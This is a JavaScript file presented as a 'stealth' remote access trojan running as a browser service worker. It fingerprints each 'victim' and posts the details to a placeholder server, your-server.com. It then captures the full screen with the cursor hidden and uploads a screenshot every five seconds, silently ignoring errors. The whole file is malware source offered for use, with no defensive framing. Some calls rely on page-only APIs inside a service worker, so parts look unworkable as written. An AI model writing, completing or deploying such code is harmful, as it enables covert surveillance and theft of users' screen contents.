// ==================== STEALTH DISCORD RAT - FULL SCREEN CAPTURE ====================

let victimId = "unknown";
let intervalId = null;
let stream = null;

// Register victim
async function registerVictim() {
    try {
        const data = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            referrer: document.referrer || "direct",
            timestamp: Date.now()
        };

        const res = await fetch('https://your-server.com/victim', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        const json = await res.json();
        if (json.victimId) victimId = json.victimId;
    } catch (e) {}
}

// Capture full screen and send
async function captureFullScreen() {
    try {
        if (!stream) {
            stream = await navigator.mediaDevices.getDisplayMedia({
                video: {
                    cursor: "never",
                    displaySurface: "monitor",
                    frameRate: { ideal: 8, max: 12 }
                },
                audio: false
            });
        }

        const video = document.createElement("video");
        video.srcObject = stream;
        await new Promise(resolve => video.onloadedmetadata = resolve);
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const base64 = canvas.toDataURL("image/jpeg", 0.55);

        await fetch('https://your-server.com/screenshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                victimId: victimId,
                image: base64,
                timestamp: Date.now()
            })
        });

        // Cleanup temporary elements
        video.remove();
        canvas.remove();

    } catch (err) {
        console.log("[RAT] Capture failed - user likely denied permission");
    }
}

// Start RAT
function startRAT() {
    if (intervalId) clearInterval(intervalId);
    
    intervalId = setInterval(() => {
        captureFullScreen();
    }, 5000); // Every 5 seconds
}

// Service Worker Events
self.addEventListener('activate', async (event) => {
    event.waitUntil(
        (async () => {
            await self.clients.claim();
            await registerVictim();
            startRAT();
        })()
    );
});

self.addEventListener('install', () => {
    self.skipWaiting();
});

// Keep alive
self.addEventListener('fetch', () => {});

// Clean up stream when service worker is stopped
self.addEventListener('beforeunload', () => {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
});
